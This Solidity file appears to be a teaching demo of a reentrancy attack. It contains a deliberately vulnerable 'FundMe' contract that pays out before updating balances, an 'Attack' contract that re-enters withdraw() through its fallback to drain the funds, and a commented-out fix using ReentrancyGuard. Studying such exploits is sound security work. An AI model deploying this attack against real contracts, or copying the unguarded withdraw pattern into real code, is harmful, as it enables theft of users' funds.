// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;
import "@openzeppelin/contracts/access/Ownable.sol";

contract FundMe{
    mapping(address => uint256) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        uint256 bal = balances[msg.sender];
        require(bal > 0);

        (bool sent,) = msg.sender.call{value: bal}("");
        require(sent, "Failed to send Ether");

        balances[msg.sender] = 0;
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

contract Attack is Ownable {
    FundMe public fundMe;
    uint256 public constant AMOUNT = 1 ether;

    constructor(address _fundMe) Ownable(msg.sender) {
        fundMe = FundMe(_fundMe);
    }

    fallback() external payable {
        if (address(fundMe).balance >= AMOUNT) {
            fundMe.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= AMOUNT);
        fundMe.deposit{value: AMOUNT}();
        fundMe.withdraw();
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }

    function withdrawAmount() public onlyOwner{
        uint256 contractBalance = address(this).balance;
        require(contractBalance > 0, "Insufficient crypto amount");
        payable(owner()).transfer(contractBalance);
    }
}

// Solution: 
//1. Use ReentrancyGuard library.
//2. Ensure all state changes happen before calling external contracts

// pragma solidity ^0.8.24;
// import "@openzeppelin/contracts/utils/ReentrancyGuard.sol";

// contract FundMeSolution is ReentrancyGuard {
//     mapping(address => uint256) public balances;

//     function deposit() public payable {
//         balances[msg.sender] += msg.value;
//     }

//     function withdraw() public nonReentrant{
//         uint256 bal = balances[msg.sender];
//         require(bal > 0);

//         (bool sent,) = msg.sender.call{value: bal}("");
//         require(sent, "Failed to send Ether");

//         balances[msg.sender] = 0;
//     }

//     function getBalance() public view returns (uint256) {
//         return address(this).balance;
//     }
// }
